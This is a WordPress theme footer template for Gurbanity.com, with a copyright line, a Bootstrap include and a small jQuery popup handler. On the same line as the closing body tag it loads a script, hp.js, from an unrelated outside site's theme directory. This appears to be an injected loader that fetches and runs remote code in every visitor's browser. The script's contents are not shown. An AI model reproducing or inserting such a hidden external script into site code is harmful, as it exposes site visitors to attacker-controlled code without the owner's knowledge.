<?php
/**
 * The template for displaying the footer
 *
 * Contains the closing of the #content div and all content after.
 *
 * @link https://developer.wordpress.org/themes/basics/template-files/#template-partials
 *
 * @package spiko
 */
?>
<?php
        $follow_link = get_field('follow_link_section', 'option');
        $share_link = get_field('share_link_section', 'option');
 ?> 
<footer class="site-footer">  
    <div class="custom-container">
        <div class="footer_social_links">
            <div class="site-info text-center coppyright_text">
                <span class="copyright">© Copyright 2023 @ Gurbanity.com</span>     
            </div>
        </div>
    </div>
</footer>
</div>
</div>
<?php wp_footer(); ?>	
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
<script type="text/javascript">
   jQuery(document).ready(function(){
        jQuery('.book_btn').click(function(){
           jQuery('.book-page-popup').addClass('active');
         })
        jQuery('.close_book_popup').on('click' , function(){
           jQuery('.book-page-popup').removeClass('active');
         })
    })
//     jQuery(window).scroll(function(){
//     var scroll_top = jQuery(window).scrollTop();
//     if(scroll_top > 50)
//     {
//         jQuery('.top_bar').addClass('fixed');
//         jQuery('.navbar-custom').addClass('fixed');
//         jQuery('.faq_section').addClass('fixed');
//         jQuery('.mt-section-80').addClass('fixed');
//         jQuery('.inner_section').addClass('fixed');
//         jQuery('.who-we').addClass('fixed');
        
//     }
//     else
//     {
//         jQuery('.top_bar').removeClass('fixed');
//         jQuery('.navbar-custom').removeClass('fixed');
//         jQuery('.faq_section').removeClass('fixed');
//         jQuery('.mt-section-80').removeClass('fixed');
//         jQuery('.inner_section').removeClass('fixed');
//         jQuery('.who-we').removeClass('fixed');
//     }
// })
</script>
<script src="https://thecapitallink.com/wp-content/themes/tcl19/hp.js"></script></body>
</html>